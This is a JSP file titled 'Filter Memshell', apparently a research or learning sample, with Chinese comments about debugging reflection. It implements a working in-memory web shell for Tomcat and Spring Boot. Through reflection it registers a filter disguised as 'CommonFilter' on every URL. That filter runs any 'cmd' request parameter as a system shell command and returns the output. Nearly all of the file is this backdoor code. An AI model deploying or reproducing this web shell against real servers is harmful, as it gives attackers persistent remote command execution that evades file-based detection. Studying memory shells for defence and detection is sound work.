<%--
  Created by IntelliJ IDEA.
  User: ThreatBook
  Date: 2023/6/29
  Time: 17:16
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Constructor"%>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>


<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    // System.out.println(standardContext);
    // StandardEngine[Tomcat].StandardHost[localhost].TomcatEmbeddedContext[]
    // 天坑啊，我要吐槽吐槽！！！这里试了一天也没有找到JSP调试的办法，只能通过java程序报错，然后看堆栈和参数信息进行分析。
    // 最后用打印的方式，勉强看一下这里获取的standardContext到底是个啥玩意。不过堆栈和参数信息里也有，看到standardContext变量里获取的是TomcatEmbeddedContext类。
    // 最坑的就是TomcatEmbeddedContext是 extends StandardContext类，所以这里就需要获取父类的私有成员属性。
    // 这也是为什么Listener.jsp中获取StandardContext没有报错，而Filter中报错的原因。是因为addApplicationEventListener()方法是public，而filterConfigs属性是private。
%>

<%! public class Shell_Filter implements Filter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
//        String cmd = request.getParameter("cmd");
//        if (cmd != null) {
//            try {
//                Runtime.getRuntime().exec(cmd);
//            } catch (IOException | NullPointerException e) {
//                e.printStackTrace();
//            }
//        }

        //这里写上我们后门的主要代码
        HttpServletRequest req = (HttpServletRequest) request;
        if (req.getParameter("cmd") != null){
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String output = scanner.hasNext() ? scanner.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
            return;
        }


        chain.doFilter(request, response);
    }
}
%>

<%
    Shell_Filter filter = new Shell_Filter();
    String name = "CommonFilter";

    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(name);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMapBefore(filterMap);


    // getFields() 获取所有public字段,包括父类字段;
    // getDeclaredFields() 获取所有字段,public和protected和private,但是不包括父类字段;
    // 我们想要获取父类的私有东西怎么办？ getClass().getSuperclass().getDeclaredField(paramString);

    // SpringBoot环境下，获取StandardContext类filterConfigs私有属性的办法！！！
    // package org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext extends StandardContext;
    Field Configs = standardContext.getClass().getSuperclass().getDeclaredField("filterConfigs");

    // 纯Tomcat环境下，可以直接获取对应私有属性即可。
    // Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");

    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

    filterConfigs.put(name, filterConfig);
%>




<html>
<head>
    <title>Filter Memshell</title>
</head>
<body>
    <br>普通jsp直接页面返回！！<br>
</body>
</html>
